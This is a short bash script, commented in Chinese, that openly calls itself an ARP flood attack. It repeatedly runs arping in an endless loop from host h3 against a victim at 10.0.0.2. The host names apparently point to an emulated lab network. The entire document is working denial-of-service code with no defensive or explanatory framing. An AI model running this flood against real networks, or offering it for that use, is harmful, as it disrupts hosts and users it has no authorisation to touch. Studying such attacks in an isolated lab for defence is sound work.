#!/bin/bash
# 簡單 ARP Flood 攻擊腳本
# 假設受害者是 10.0.0.2，從 h3 不停發 ARP 封包

VICTIM_IP="10.0.0.2"
IFACE="h3-eth0"

echo "[*] Starting ARP flood against ${VICTIM_IP} on interface ${IFACE} ..."
echo "    Press Ctrl+C to stop."

# 無限迴圈，不停送 ARP 封包
while true; do
    # -c 5 一次發 5 個，你可以依需求調整
    arping -c 5 -I "$IFACE" "$VICTIM_IP" > /dev/null 2>&1
done
